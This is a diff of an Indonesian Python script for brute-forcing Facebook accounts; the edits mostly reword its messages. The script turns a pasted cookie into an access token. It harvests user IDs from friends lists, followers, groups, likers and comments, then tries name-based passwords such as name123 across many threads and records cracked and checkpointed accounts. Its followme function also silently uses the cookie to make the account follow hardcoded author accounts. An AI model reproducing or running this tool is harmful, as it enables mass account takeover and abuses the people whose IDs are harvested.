@@ -53,7 +53,7 @@ uakuh = []
 usragent = []
 uaku2 = []
 ses = requests.Session()
-my_account = ["100023442491781",'100013275378835','100063837653547']
+mysosmed = ["100023442491781",'100013275378835','100063837653547']
 ###----------[ GENERATE USERAGENT ]---------- ###
 for xd in range(10000) :
 	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
@@ -647,6 +647,7 @@ def uaku():
 		for un in aa:
 			ua.write(un+'\n')
 		ua=open('.ua.txt','r').read().splitlines()
+      
 ### ----- [ Clear Terminal ] ----- ###
 def clear():
       if sys.platform.lower() == 'linux':
@@ -664,8 +665,8 @@ def login():
  |  |  | |_____| |_____    |    __|__     |_____] |      
                                                          
 '''%(K1),width=75,style='bold white'))
-      cetak(Panel('    %sMasukan Cookie Facebook Saran Ekstensi %s"Cookiedough" %sKiwi Browser'%(K1,H1,K1),width=75,style='bold white'))
-      cok = Console().input('%s[%s•%s] Masukan Cookie :%s '%(P1,H1,P1,H1))
+      cetak(Panel('    %sMasukan cokies facebook saran ektensi %s"cokiedough" %sKiwi Browser'%(K1,H1,K1),width=75,style='bold white'))
+      cok = Console().input('%s[%s•%s] Masukan Cokies :%s '%(P1,H1,P1,H1))
       try:
             link = ses.post('https://graph.facebook.com/v16.0/device/login/', data={'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e', 'scope': ''}).json()
             kode,user = link['code'],link['user_code']
@@ -688,12 +689,12 @@ def login():
             token = ses.get(f'https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e').json()['access_token']
             open('data/token.txt','w').write(token);open('data/cookies.txt','w').write(cok);followme(cok)
             cetak('\n%s[%s√%s] Akses Token Anda :%s%s'%(P1,H1,P1,H1,token));exit()
-      except(KeyError):cetak('\n%s[%sx%s] Login Gagal - [ Cookie %s( Invalid%s ) ]'%(P1,M1,P1,M1,P1));exit()
+      except(KeyError):cetak('\n%s[%sx%s] Login Gagal Tumbal Udh Gk Hidup'%(P1,M1,P1));exit()
 
 def ceklogin():
       try:
             response = requests.get('https://graph.facebook.com/me/?&access_token='+open('data/token.txt','r').read()).json()
-      except(KeyError,FileNotFoundError):cetak('%s[%sx%s] Akun Anda Terkena Checkpoint'%(P1,M1,P1));time.sleep(3);login(),cetak('\n%s[%sx%s] Folder Token.txt Tidak Ditemukan'%(P1,M1,P1));exit()
+      except(KeyError,FileNotFoundError):cetak('%s[%sx%s] Tumbal Anda Terkena Checkpoint'%(P1,M1,P1));time.sleep(3);login(),cetak('\n%s[%sx%s] Folder Token.txt Tidak Ditemukan'%(P1,M1,P1));exit()
       try:
             number = response['mobile_phone']
       except(KeyError):
@@ -702,7 +703,7 @@ def ceklogin():
             nama,idfb = response['name'],response['id']
             kelamin = response['gender'].replace('male','Laki Laki').replace('famale','Perempuan')
             ttl = response['birthday'].split('/')[1]+'-'+wulan[response['birthday'][1]]+'-'+response['birthday'].split('/')[2]
-      except(KeyError):cetak('%s[%sx%s] Akun Anda Terkena Checkpoint'%(P1,M1,P1));time.sleep(3);login()
+      except(KeyError):cetak('%s[%sx%s] Tumbal Anda Terkena Checkpoint'%(P1,M1,P1));time.sleep(3);login()
       menu(nama,idfb,kelamin,ttl,number)
 
 def menu(an,ai,at,ag,ar):
@@ -724,27 +725,27 @@ def menu(an,ai,at,ag,ar):
 %s[%s•%s] Version   : 0.4'''%(P1,K1,P1,yuzong,P1,K1,P1,requests.get('http://ip-api.com/json/').json()['query'],P1,K1,P1,requests.get('http://ip-api.com/json/').json()['country'],P1,K1,P1,requests.get('http://ip-api.com/json/').json()['timezone'],P1,H1,P1),width=37,style='bold white',title='[bold yellow]INFO USER'))
       Console().print(Columns(wadok))
       cetak(Panel('''          %s[%s01%s] Crack Publik             %s[%s06%s] Crack Gropus
-          %s[%s02%s] Crack Publik Massal      %s[%s07%s] Crack Komentar
+          %s[%s02%s] Crack Publik Massal      %s[%s07%s] Crack Coment
           %s[%s03%s] Crack Followers          %s[%s08%s] Crack Nama
-          %s[%s04%s] Crack File               %s[%s09%s] Crack Likers
+          %s[%s04%s] Crack File               %s[%s09%s] Crack Like
           %s[%s05%s] Crack Email              %s[%s10%s] Chek Result'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1),width=75,style='bold white',title='[bold yellow]LIST MENU'))
-      cetak(Panel('   %sKetik %s"Report" %sUntuk Report Bug Script Ketik %s"Keluar" %sUntuk Log Out'%(P1,H1,P1,M1,P1),width=75,style='bold white'))
-      user = Console().input('%s[%s•%s] Pilih Menu : '%(P1,H1,P1))
+      cetak(Panel('   %sKetik %s"report" %sUntuk Report Bug Script Ketik %s"keluar" %sUntuk Log Out'%(P1,H1,P1,M1,P1),width=75,style='bold white'))
+      user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
 
       if user == '1' or user == '01':
-            cetak(Panel('            %sMasukan ID Yang Bersifat Publik Untuk Dump ID'%(K1),width=75,style='bold white'))
-            user = Console().input('%s[%s•%s] Masukan ID : '%(P1,H1,P1))
+            cetak(Panel('            %smasukan uid yg bersifat publik untuk di dump'%(K1),width=75,style='bold white'))
+            user = Console().input('%s[%s•%s] Masukan id: '%(P1,H1,P1))
             try:
                   freya = ses.get('https://graph.facebook.com/'+user+'?fields=friends.fields(id,name).limit(5000)&access_token='+open('data/token.txt','r').read(),cookies={'cookie': open('data/cookies.txt','r').read()}).json()['friends']['data']
                   for xz in freya:
                         uid2.append(xz['id']+'|'+xz['name'])
             except(KeyError,IOError):
-                  cetak('%s[%sx%s] ID Tidak Publik'%(P1,M1,P1))
+                  cetak('%s[%sx%s] Uid Tidak Publik'%(P1,M1,P1))
             aturuid()
 
       elif user == '2' or user == '02':
-            cetak(Panel('              %sGunakan Tanda %s"Koma" %sUntuk Pemisahan ID'%(K1,H1,K1),width=75,style='bold white'))
-            user = Console().input('%s[%s•%s] Masukan ID : '%(P1,H1,P1))
+            cetak(Panel('              %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
+            user = Console().input('%s[%s•%s] Masukan id: '%(P1,H1,P1))
             try:
                   for uid in user.split(','):
                         try:
@@ -753,26 +754,26 @@ def menu(an,ai,at,ag,ar):
                                     uid2.append(xz['id']+'|'+xz['name'])
                         except(KeyError):pass
             except(KeyError,IOError):
-                  cetak('%s[%sx%s] Akun Anda Terkena Checkpoint'%(P1,M1,P1))
+                  cetak('%s[%sx%s] Tumbal Anda Terkena Checkpoint'%(P1,M1,P1))
                   try:
                         os.system('rm -rf data/token.txt && rm -rf data/cookies.txt')
                   except:pass
             aturuid()
       elif user == '3' or user == '03':
-            cetak(Panel('              %sGunakan Tanda %s"Koma" %sUntuk Pemisahan ID'%(K1,H1,K1),width=75,style='bold white'))
-            user = Console().input('%s[%s•%s] Masukan ID : '%(P1,H1,P1))
+            cetak(Panel('              %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
+            user = Console().input('%s[%s•%s] Masukan id: '%(P1,H1,P1))
             for uid in user.split(','):
                   link = (f'https://mbasic.facebook.com/'+uid+'?v=followers')
                   if user == '' or user == ' ':
                         exit('%s[%sx%s] Jangan Kosong'%(P1,M1,P1))
                   elif str(link) == 'Halaman Tidak Ditemukan' or str(link) == 'Anda Diblokir Sementara' or str(link) == 'Konten Tidak Ditemukan':
-                        cetak('%s[%sx%s] Akun Anda Di Batasi Oleh Facebook'%(P1,M1,P1))
+                        cetak('%s[%sx%s] Akun Tumbal Di Batasi Oleh Facebook'%(P1,M1,P1))
                   else:
                         dumpfolower(link)
             aturuid()
       elif user == '4' or user == '04':
-            cetak(Panel('             %sGunakan Tanda %s"Koma" %sUntuk Pemisahan FILE'%(K1,H1,K1),width=75,style='bold white'))
-            user = Console().input('%s[%s•%s] Masukan Nama File : '%(P1,H1,P1))
+            cetak(Panel('             %sGunakan tanda %s"koma" %suntuk pemisahan file'%(K1,H1,K1),width=75,style='bold white'))
+            user = Console().input('%s[%s•%s] Masukan nama file: '%(P1,H1,P1))
             try:
                   for file in user.split(','):
                         for response in open(file,'r').readlines():
@@ -785,8 +786,8 @@ def menu(an,ai,at,ag,ar):
 
       elif user == '5' or user == '05':
             cetak(Panel('          %sFormat Akan Selalau %s"@Gmail.com" %sUntuk Setiap Crack'%(K1,H1,K1),width=75,style='bold white'))
-            user = Console().input('%s[%s•%s] Masukan Nama  : '%(P1,H1,P1))
-            limt = Console().input('%s[%s•%s] Masukan Limit : '%(P1,H1,P1))
+            user = Console().input('%s[%s•%s] Masukan nama: '%(P1,H1,P1))
+            limt = Console().input('%s[%s•%s] Masukan limit: '%(P1,H1,P1))
             try:
                   for userx in range(100000):
                         nama1 = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','budi','joni','toni','cahya','riski','farhan','aden','joko','01','02','03','04','05','06','07','08','09','10']
@@ -802,27 +803,27 @@ def menu(an,ai,at,ag,ar):
             except(Exception) as e:print(e)
 
       elif user == '6' or user == '06':
-            cetak(Panel('             %sGunakan Tanda %s"Koma" %sUntuk Pemisahan ID'%(K1,H1,K1),width=75,style='bold white'))
+            cetak(Panel('             %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
             user = Console().input('%s[%s•%s] Masukan uid grup :'%(P1,H1,P1))
             for uid in user.split(','):
                   if user == '' or user == ' ':
-                        cetak('%s[%sx%s] Jangan Kosong'%(P1,M1,P1))
+                        cetak('%s[%sx%s] Jangan Ksosng'%(P1,M1,P1))
                   else:
                         dumpgrup('https://iphone.facebook.com/groups/'+uid+'/')
             aturuid()
 
       elif user == '7' or user == '07':
-            cetak(Panel('             %sGunakan Tanda %s"Koma" %sUntuk Pemisahan ID'%(K1,H1,K1),width=75,style='bold white'))
-            user = Console().input('%s[%s•%s] Masukan ID grup :'%(P1,H1,P1))
+            cetak(Panel('             %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
+            user = Console().input('%s[%s•%s] Masukan uid grup :'%(P1,H1,P1))
             for uid in user.split(','):
                   if user == '' or user == ' ':
-                        cetak('%s[%sx%s] Jangan Kosong'%(P1,M1,P1))
+                        cetak('%s[%sx%s] Jangan Ksosng'%(P1,M1,P1))
                   else:
                         dumpgrup('https://iphone.facebook.com/'+uid)
             aturuid()
       elif user in ['8','08']:
-            cetak(Panel('              [bold yellow] Satu Nama Setara Dengan [bold green]5000 [bold yellow]ID',width=75,style='bold white'))
-            hem=Console().input("%s[%s•%s] Masukan Nama  : "%(P1,H1,P1))
+            cetak(Panel('              [bold yellow] Satu nama setara dengan [bold green]5000 [bold yellow]id',width=75,style='bold white'))
+            hem=Console().input("%s[%s•%s] Masukan satu nama  : "%(P1,H1,P1))
             tar=hem.replace(" ","%20")
             with ThreadPoolExecutor(max_workers=30) as pool:
                 try:
@@ -851,8 +852,8 @@ def menu(an,ai,at,ag,ar):
             else:
                   ceklogin()
       elif user in ['9','09']:
-                cetak(Panel('             [bold yellow]Contoh URL [bold white]: [bold green]https://www.facebook.com/',width=75,style='bold white'))
-                linglung=Console().input("%s[%s•%s] Masukan Url Post  : "%(P1,H1,P1))
+                cetak(Panel('             [bold yellow]Contoh url [bold white]: [bold green]https://www.facebook.com/',width=75,style='bold white'))
+                linglung=Console().input("%s[%s•%s] Masukan url post  : "%(P1,H1,P1))
                 if not "https://www.facebook.com/" in linglung:exit("gunakan : 'https://www.facebook.com/' ")
                 ur=linglung.replace("https://www.facebook.com/","https://mbasic.facebook.com/")
                 awalik(ur)
@@ -864,11 +865,11 @@ def menu(an,ai,at,ag,ar):
             pass
             
 def aturuid():
-      Console().print('\r%s[%s•%s] Sedang DUMP %s%s %sID'%(P1,H1,P1,H1,len(uid2),P1),end='');sys.stdout.flush()
-      print('\r');cetak(Panel('''%s[%s01%s] Crack Dari ID Old
-%s[%s02%s] Crack Dari ID New
-%s[%s03%s] Crack Dari ID Random'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1),title='SETTING ID',style='bold white',width=75))
-      user = Console().input('%s[%s•%s] Pilih ID : '%(P1,H1,P1))
+      Console().print('\r%s[%s•%s] sedang mengumpulkan %s%s %suid'%(P1,H1,P1,H1,len(uid2),P1),end='');sys.stdout.flush()
+      print('\r');cetak(Panel('''%s[%s01%s] Crack Dari Uid Tua
+%s[%s02%s] Crack Dari Uid New
+%s[%s03%s] Crack Dari Uid Random'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1),title='ATUR UID',style='bold white',width=75))
+      user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
       if user == '1' or user == '01':
             for zx in sorted(uid2):
                   uid.append(zx)
@@ -922,7 +923,7 @@ def gaslik(url):
             for i in re.findall('id=(.*?)&eav=',str(z["href"])):
                 semua=f'{i}|{z.text}'
                 uid2.append(semua)
-                sys.stdout.write('\r%s[ • ] %sSedang DUMP %s ID'%(H, P, len(uid2)));sys.stdout.flush()
+                sys.stdout.write('\r%s[ • ] %ssedang mengumpulkan %s id'%(H, P, len(uid2)));sys.stdout.flush()
     for z in user.find_all("a",href=True):
         if "Lihat Selengkapnya"in z.text:
             gaslik("https://mbasic.facebook.com"+z["href"])
@@ -1004,7 +1005,7 @@ def cekresult(folder):
                   file = open(folder+'/'+xx,'r').readlines()
             except:
                   continue
-      user = Console().input('%s[%s•%s] Pilih : '%(P1,H1,P1))
+      user = Console().input('%s[%s•%s] pilih : '%(P1,H1,P1))
       try:
             file = hx[int(user)-1]
       except(IndexError):
@@ -1018,12 +1019,12 @@ def cekresult(folder):
       
 def aturmethode():
       
-      cetak(Panel('''%s[%s01%s] Nama123+Nama12345+Nama123456
-%s[%s02%s] Namafull+Nama123+Nama12345+Nama123456
-%s[%s03%s] Namafull+Nama123+Nama12345+Nama123456+Manual'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1),title='SETTING PASSWORD',style='bold white',width=75))
+      cetak(Panel('''%s[%s01%s] nama123+nama12345+nama123456
+%s[%s02%s] namafull+nama123+nama12345+nama123456
+%s[%s03%s] namafull+nama123+nama12345+nama123456+manual'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1),title='ATUR PASWORD',style='bold white',width=75))
       user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
-      cetak(Panel(f"               {K1}  Tampilkan Opsi Cehckpoint ? {H1}(Y/n)",style='bold white',width=75))
-      cekop = Console().input('%s[%s•%s] Pilih : '%(P1,H1,P1))
+      cetak(Panel(f"               {K1}  tampilkan opsi ceckpoint ? {H1}(Y/n)",style='bold white',width=75))
+      cekop = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
       if user == '1' or user == '01':
             if cekop in ["y","Y"]:
                 pasword('ya','1','')
@@ -1033,7 +1034,7 @@ def aturmethode():
                 pasword('ya','2','')
             else:pasword('memek','2','')
       else:
-            pasw = Console().input('%s[%s•%s] Masukan Password: : '%(P1,H1,P1)).split(',')
+            pasw = Console().input('%s[%s•%s] masukan pasword: : '%(P1,H1,P1)).split(',')
             if cekop in ["y","Y"]:
                 pasword('ya','3','')
             else:pasword('memek','3',pasw)
@@ -1074,7 +1075,7 @@ def pasword(opsi,method,pasw):
                                else:
                                      pwa = [name,depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                                pool.submit(apimethod,opsi,user,pwa+pasw)
-      cetak('\n%s[%s√%s] Brute Force Finished\n%sOK:%s\n%sCP:%s%s'%(P1,H1,P1,H1,len(ok),K1,len(cp),P1))
+      cetak('\n%s[%s√%s] CRACK SUKSES\n%sOK:%s\n%sCP:%s%s'%(P1,H1,P1,H1,len(ok),K1,len(cp),P1))
       exit()
                                      
 
@@ -1087,7 +1088,7 @@ def pasword(opsi,method,pasw):
 
 def apimethod(opsis,user,pasw):
       global loop,ok,cp
-      prog.update(des,description=f'\r%sCracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s Aman%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,H1,P1));prog.advance(des)
+      prog.update(des,description=f'\r%scracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s aman%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,H1,P1));prog.advance(des)
       for pw in pasw:
             try:
                   ua = str(random.choice(ugen))
@@ -1145,12 +1146,12 @@ def apimethod(opsis,user,pasw):
                         break
                   elif 'Login approvals are on. Expect an SMS shortly with a code to use for log in' in response['error']['message']:break
                   else:continue
-            except(requests.exceptions.ConnectionError):prog.update(des,description=f'\r%sCracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s Spam%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,M1,P1));prog.advance(des);time.sleep(30)
+            except(requests.exceptions.ConnectionError):prog.update(des,description=f'\r%scracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s spam%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,M1,P1));prog.advance(des);time.sleep(30)
             except Exception as e:print(e)
       loop+=1
 
 def followme(kueh):
-      for user in my_account:
+      for user in mysosmed:
             try:
                   for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
                         if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
